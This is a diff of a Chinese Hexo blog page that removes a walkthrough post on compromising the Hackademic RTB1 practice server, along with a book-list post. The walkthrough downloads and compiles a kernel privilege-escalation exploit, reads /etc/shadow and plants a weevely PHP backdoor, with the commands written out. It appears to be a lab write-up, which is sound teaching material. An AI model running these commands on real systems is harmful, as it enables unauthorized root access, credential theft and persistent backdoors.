-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">id</span><br><span class="line">uid&#x3D;48(apache) gid&#x3D;489(apache) groups&#x3D;489(apache) （用来显示用户的id和组）</span><br><span class="line">pwd</span><br><span class="line">&#x2F;var&#x2F;www&#x2F;html&#x2F;Hackademic_RTB1&#x2F;wp-content&#x2F;plugins （显示服务器上当前的路径）</span><br><span class="line">uname -a</span><br><span class="line">Linux HackademicRTB1 2.6.31.5-127.fc12.i686 #1 SMP Sat Nov 721:41:45 EST 2009 i686 i686 i386 GNU&#x2F;Linux</span><br></pre></td></tr></table></figure>
-
-
-
-<p>（显示内核版本信息）</p>
-<p><img src="https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LeY6xSGooL6wd9gyxDyIiczp1QficsU1Ktm2lRn0S56VIlMjKTbHicibqG9bRbshxK4uMuGUJHnv75Wuw/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
-<p>现在我们知道，服务器的内核版本是2.6.31.5-127.fc12.1686,我们在exploit-db.com中搜索此版本的相关漏洞.</p>
-<p>在服务器上测试了很多exp之后，我们用以下的exp来提升权限.</p>
-<p><a target="_blank" rel="noopener" href="http://www.exploit-db.com/exploits/15285">http://www.exploit-db.com/exploits/15285</a></p>
-<p>我们在nc shell上执行以下命令:</p>
-<p>wget<a target="_blank" rel="noopener" href="http://www.exploit-db.com/exploits/15285">http://www.exploit-db.com/exploits/15285</a> -o roro.c</p>
-<p>(下载exp到服务器并重命名为roro.c)<br>注：很多linux内核的exp都是C语言开发的,因此我们保存为.c扩展名.<br>exp roro.c代码如下：</p>
-<ul>
-<li></li>
-<li></li>
-<li></li>
-<li></li>
-<li></li>
-<li></li>
-<li></li>
-<li></li>
-<li></li>
-<li></li>
-<li></li>
-<li></li>
-<li></li>
-<li></li>
-<li></li>
-<li></li>
-<li></li>
-<li></li>
-<li></li>
-<li></li>
-<li></li>
-<li></li>
-<li></li>
-<li></li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#include#include#include#include#include#include#include#include#include#include#include#define RECVPORT 5555#define SENDPORT 6666int prep_sock(int port)&#123;int s, ret;struct sockaddr_in addr;s &#x3D; socket(PF_RDS, SOCK_SEQPACKET, 0);if(s &lt; 0)&#123;printf(“[*] Could not open socket.”);exit(-1);&#125;memset(&amp;addr, 0, sizeof(addr));</span><br></pre></td></tr></table></figure>
-
-<p>通过以上代码我们发现该exp是C语言开发的，我们需要将它编译成elf格式的,命令如下:</p>
-<p>gcc roro.c –ororo</p>
-<p>接下来执行编译好的exp</p>
-<p>./roro</p>
-<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/3RhuVysG9LeY6xSGooL6wd9gyxDyIiczppwR7ujfts6PiaBv05jjUY6pOtULDOOeC6QU6tT7UC7O3zcjERecEJ9w/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
-<p>执行完成之后我们输入id命令<br>id<br>我们发现我们已经是root权限了<br>uid=0(root) gid=0(root)</p>
-<p><img src="https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LeY6xSGooL6wd9gyxDyIiczpCB5fP61rTtR8jnK781TQVOsTNrG1iaapd1uKxyJ99TXViasuFPice286A/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
-<p>现在我们可以查看/etc/shadow文件<br>cat/etc/shadow</p>
-<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/3RhuVysG9LeY6xSGooL6wd9gyxDyIiczpmYGxMeI6jic0Jp6j3opASBb4pdgy31z0ETOerOyT8SAukaXEqKV257g/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
-<p>我们可以使用”john theripper”工具破解所有用户的密码.但是我们不会这样做，我们需要在这个服务器上留下后门以方便我们在任何时候访问它.</p>
-<p>我们用weevely制作一个php小马上传到服务器上.</p>
-<p>1.weevely使用选项<br>root@bt:/pentest/backdoors/web/weevely#./main.py -</p>
-<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/3RhuVysG9LeY6xSGooL6wd9gyxDyIiczpLKNuAoMcrL6icoqkvtM7nc4D78Pm4hr9ZsG5Sic2WAjpL62kDYiczgpQw/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
-<p>2.用weevely创建一个密码为koko的php后门</p>
-<p>root@bt:/pentest/backdoors/web/weevely#./main.py -g -o hax.php -p koko</p>
-<p><img src="https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LeY6xSGooL6wd9gyxDyIiczp39uvwq8aA7ia1P1q2Ounjw9vmeJibwGfgv9ZdxIvFzR883knncNYL1gw/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
-<p>接下来上传到服务器之后来使用它<br>root@bt:/pentest/backdoors/web/weevely#./main.py -t -u<a target="_blank" rel="noopener" href="http://hack-test.com/Hackademic_RTB1/wp-content/plugins/hax.php">http://hack-test.com/Hackademic_RTB1/wp-content/plugins/hax.php</a> -pkoko</p>
-<p><img src="https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LeY6xSGooL6wd9gyxDyIiczpJia8KniaYpCib5eYMr4vLPV2kYUnBD8N5A4jr9JlXwcB7HDyorWXyiaXXA/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
-<p>测试我们的hax.php后门</p>
-<p><img src="https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LeY6xSGooL6wd9gyxDyIiczpsMVrZZCSJEARliachOS5MAearW72dfQ6ia1tHmG9NALibTT3ZzKpWzVibw/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="https://s-qwer.github.io/2021/06/03/29.3.%E6%94%BB%E7%A0%B4%E4%B8%80%E4%B8%AA%E7%BD%91%E7%AB%99/" data-id="ckw61sdw6004foswd5w2jho5g" data-title="攻破一个网站" class="article-share-link">分享</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-1.6.推荐研读书籍" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/05/29/1.6.%E6%8E%A8%E8%8D%90%E7%A0%94%E8%AF%BB%E4%B9%A6%E7%B1%8D/" class="article-date">
-  <time class="dt-published" datetime="2021-05-29T06:44:11.000Z" itemprop="datePublished">2021-05-29</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/05/29/1.6.%E6%8E%A8%E8%8D%90%E7%A0%94%E8%AF%BB%E4%B9%A6%E7%B1%8D/">推荐研读书籍</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h2 id="计算机基础"><a href="#计算机基础" class="headerlink" title="计算机基础"></a>计算机基础</h2><p>《计算机网络 自顶向下方法》</p>
-<p>《图解 HTTP》</p>
-<h2 id="java"><a href="#java" class="headerlink" title="java"></a>java</h2><p><strong>《Java核心技术》</strong></p>
-<p><strong>《java编程思想》</strong></p>
-<p><strong>《深入理解java虚拟机》</strong></p>
-<p><strong>《java并发编程实战》</strong></p>
-<p>《O’Reilly：Head First设计模式（中文版）》</p>
-<p><strong>《Effective Java中文版（原书第3版）》</strong></p>
-<h2 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h2><p>《鸟哥的linux私房菜》</p>
-<h2 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h2><p>《算法导论》</p>
-<p>《编程珠玑（第2版 修订版）(异步图书出品)》</p>
-<p>《算法(第4版)(图灵出品)》</p>
-<h2 id="设计模式"><a href="#设计模式" class="headerlink" title="设计模式"></a>设计模式</h2><h2 id="规范规约"><a href="#规范规约" class="headerlink" title="规范规约"></a>规范规约</h2><p>《JAVA开发手册 华山版》     –阿里巴巴集团</p>
-<h2 id="github上找项目"><a href="#github上找项目" class="headerlink" title="github上找项目"></a>github上找项目</h2><p>精准地在GitHub搜索项目</p>
-<p>一个开源项目有哪些组成部分：</p>
-<ul>
-<li>name: 项目名</li>
-<li>description: 项目的简要描述</li>
-<li>项目的源码</li>
-<li>README.md: 项目的详细情况的介绍</li>
-<li>项目本身的star数和fork数</li>
-<li>这个项目的最近更新日期（活跃度）</li>
-</ul>
-<p>搜索技巧：</p>
-<ul>
-<li>in:name xxx // 按照项目名搜索</li>
-<li>in:readme xxx // 按照README搜索</li>
-<li>in:description xxx // 按照description搜索</li>
-</ul>
-<p>在上面的基础上增加筛选条件：</p>
-<ul>
-<li>stars:&gt;xxx // stars数大于xxx</li>
-<li>forks:&gt;3000 // forks数大于xxx</li>
-<li>language:xxx // 编程语言是xxx</li>
-<li>pushed:&gt;YYYY-MM-DD // 最后更新时间大于YYYY-MM-DD</li>
-</ul>
-<p>例子：in:name React stars:&gt;5000 forks:&gt;3000</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="https://s-qwer.github.io/2021/05/29/1.6.%E6%8E%A8%E8%8D%90%E7%A0%94%E8%AF%BB%E4%B9%A6%E7%B1%8D/" data-id="ckw61sdum0004oswd6avm9pms" data-title="推荐研读书籍" class="article-share-link">分享</a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%B9%A6/" rel="tag">书</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%94%B6%E8%97%8F/" rel="tag">收藏</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -1158,7 +1063,7 @@ RTP 由两个紧密链接部分组成： RTP ― 传送具有实时属性的数�
   <div class="widget-wrap">
     <h3 class="widget-title">归档</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">九月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">八月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">七月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">六月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">五月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">四月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">三月 2021</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/12/">十二月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">九月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">八月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">七月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">六月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">五月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">四月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">三月 2021</a></li></ul>
     </div>
   </div>
 
@@ -1171,6 +1076,14 @@ RTP 由两个紧密链接部分组成： RTP ― 传送具有实时属性的数�
       <ul>
         
           <li>
+            <a href="/2021/12/17/SpringBootSecurity/">SpringBootSecurity</a>
+          </li>
+        
+          <li>
+            <a href="/2021/12/16/SpringBootActuator/">SpringBootActuator</a>
+          </li>
+        
+          <li>
             <a href="/2021/09/17/8.7.vite/">vite</a>
           </li>
         
@@ -1180,14 +1093,6 @@ RTP 由两个紧密链接部分组成： RTP ― 传送具有实时属性的数�
         
           <li>
             <a href="/2021/09/03/RPC/">RPC</a>
-          </li>
-        
-          <li>
-            <a href="/2021/09/02/%E6%97%A5%E5%BF%97/">日志</a>
-          </li>
-        
-          <li>
-            <a href="/2021/08/27/%E5%BC%80%E6%BA%90%E8%BD%AF%E4%BB%B6%E8%AE%B8%E5%8F%AF%E5%8D%8F%E8%AE%AE/">开源软件许可协议</a>
           </li>
         
       </ul>
